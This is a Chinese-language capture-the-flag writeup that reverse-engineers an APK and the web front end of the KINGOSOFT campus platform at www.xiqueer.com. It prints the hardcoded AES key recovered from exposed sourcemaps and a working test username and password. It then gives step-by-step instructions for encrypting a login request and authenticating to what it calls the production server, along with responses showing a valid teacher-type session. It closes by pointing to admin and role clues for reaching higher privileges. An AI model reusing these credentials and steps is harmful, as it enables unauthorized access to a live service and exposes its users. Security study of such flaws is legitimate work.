# WRITEUP — 喜鹊 APK 逆向工作区夺旗

## 结论

```text
flag{www.xiqueer.com;1981448;a}
```

- site: `www.xiqueer.com`
- username: `1981448`
- password: `a`

该账号在 `http://www.xiqueer.com:80/pc/`（KINGOSOFT 掌上校园服务平台 PC 端）实测可成功登录，并能继续访问登录态只读接口。

## 约束与边界

- 只使用工作区内已有 APK/反编译产物/抓包产物与公开前端资源做定位。
- 验证阶段仅执行登录请求与只读 GET 复核；未对任何容器/目标数据做删除、修改、新增。
- 不复述抓包中的真实个人敏感信息；本 writeup 只保留解题所需最小证据。

## 关键发现

### 1. 后台候选收敛

全工作区域名/端点枚举后，核心候选为：

| 候选 | 结论 |
|---|---|
| `http://www.xiqueer.com:80/pc/` | PC 端平台入口，前端 sourcemap 暴露，最终拿到可登录账号 |
| `http://api.xiqueer.com/manager/` | manager 后台登录页存在，表单 `userLoginAction.do`；同账号不适用 |
| `http://192.168.0.213:8080/kingotimsp/` / `http://192.168.7.128:8881/` | APK assets 内网/演示地址，当前网络不可达 |
| `https://xk.henu.edu.cn` | 抓包中的校方教务系统，非本题所需 flag |

### 2. PC 前端 sourcemap 暴露登录算法

`http://www.xiqueer.com:80/pc/` 首页加载：

- `static/js/app.d209e553dbf6fc0d4804.1718182731122.js`
- `static/js/0.ad17780f8d05d2ca5319.1718182731122.js`

对应 `.js.map` 可公开访问。还原 `src/api/index.js` 得到 PC 接口请求封装：

- 业务参数先 JSON 序列化
- `enc = AES-ECB-PKCS7(Base64)` 
- AES key 硬编码：`abcdefgabcdefg12`
- 以表单形式提交：`enc=<base64>`

关键源码语义：

```js
export function encrypt(word, keyStr){
  keyStr = keyStr ? keyStr : 'abcdefgabcdefg12';
  ...
  CryptoJS.AES.encrypt(srcs, key, {mode:CryptoJS.mode.ECB,padding: CryptoJS.pad.Pkcs7})
}
```

### 3. 登录组件注释遗留测试账号

`src/components/login/login.vue` 中存在旧测试地址注释：

```text
http://192.168.7.60:8080/KWWSYS/wap/wapController/getLoginInfoNew.action?loginId=1981448&pwd=a&xxdm=00000&sjbz=123456&os=android&sswl=46000&sjxh=sum&xtbb=7.00&appver=2.3.501
```

其中直接给出可用组合：

- `loginId = 1981448`
- `pwd = a`
- `xxdm = 00000`

### 4. 生产 PC 登录验证成功

构造 PC 登录明文参数：

```json
{"loginNum":"1981448","loginPwd":"a","xxdm":"00000","loginMode":"1","accessToken":null}
```

按上述 AES-ECB 算法加密为 `enc` 后，POST 到：

```text
http://www.xiqueer.com:80/pc/login/userLogin.action
```

实测返回核心字段：

```json
{
  "flag": "0",
  "uuid": "00000_1981448",
  "xxdm": "00000",
  "userType": "TEA",
  "yhzh": "1981448",
  "xqzh": "00000_1981448",
  "qdqx": "1",
  "zxbxqx": "1",
  "qdwh": "1"
}
```

`flag: "0"` 且返回 `accessToken/uuid/yhzh` 等会话字段，判定登录成功。

### 5. 登录态只读复核

使用登录返回的 `accessToken` 继续按同一 AES 封装调用只读接口：

- `GET /pc/skqd/xnxq.action` — 返回学年学期列表
- `GET /pc/PcSzController/selectZxjxSchool.action` — 返回学校/接口地址列表

均可返回数据，证明该会话不是单纯伪造响应，而是真实可用登录态。

## 复现要点

最小复现逻辑：

1. 访问 `http://www.xiqueer.com:80/pc/` 获取前端 JS 与 `.js.map`。
2. 从 sourcemap 还原 `src/api/index.js`，确认 `enc` 生成算法与 key `abcdefgabcdefg12`。
3. 从 `login.vue` 注释提取测试账号 `1981448 / a / xxdm=00000`。
4. 用 AES-ECB-PKCS7 加密登录 JSON，POST `enc` 到 `/pc/login/userLogin.action`。
5. 响应含 `"flag":"0"` 即为成功。

## 备注

- `api.xiqueer.com/manager/` 后台登录页确认存在，表单为 `loginId/upassword/randnumber`，客户端会将 `upassword` 做 SHA-1 后提交；但 `1981448/a` 在该入口返回 `flag=1`，不能作为该站 flag。
- 若要继续追更高权限账号，可静态追踪 sourcemap 中 `cmadmin`、`xtgl`、`roles` 等线索；本轮未扩大爆破、未做破坏性测试。
